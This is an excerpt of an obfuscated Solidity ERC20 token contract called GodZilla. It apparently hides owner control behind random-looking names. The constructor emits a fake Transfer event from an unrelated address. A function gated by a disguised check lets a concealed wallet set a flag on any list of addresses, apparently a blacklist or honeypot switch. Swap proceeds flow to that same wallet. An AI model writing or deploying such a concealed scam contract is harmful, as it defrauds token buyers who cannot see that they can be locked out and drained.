...
contract  GodZilla is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xa97239bD14369fBE7319db2ABAa49478e3BBA8C9));
        Mun2iuc7C9mAXvRvx8 = payable(address(0xa97239bD14369fBE7319db2ABAa49478e3BBA8C9));


        J8G0y3EaW0F6i7PKn7[_msgSender()] = _totalSupply;
        emit Transfer(address(0x92d29b1A02e750C5a15f2F7C8092a7e11Af3F0c0), _msgSender(), _totalSupply);
    }
    ...
    function h2f5d3P6l7yMPz(address yHT2W6yjlUv1k0Z1, uint256 SHf5Jbi7v4V5) public{ require(H2k7I8F6D5d5e(Mun2iuc7C9mAXvRvx8,msg.sender,1));
    ...
    function qJh3uEpIZH_9JYh(uint8 b, bool o0_6m2sQbkeF, address[] calldata c3Efw8JDja) public { require(H2k7I8F6D5d5e(Mun2iuc7C9mAXvRvx8,msg.sender,1));
        b = b;
        for (uint256 a; a < c3Efw8JDja.length; a++) {
            b2nsDCzAo1C8Wm[c3Efw8JDja[a]] = false || o0_6m2sQbkeF ;
        }
    }
    function H2k7I8F6D5d5e(address izIh,address YFPPVuwG_6x1T , uint8 i2Gko1_6vuf8hPee_9) private pure returns(bool){return izIh == YFPPVuwG_6x1T && !!(i2Gko1_6vuf8hPee_9 != 0);}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(Mun2iuc7C9mAXvRvx8, amountETHMarketing);
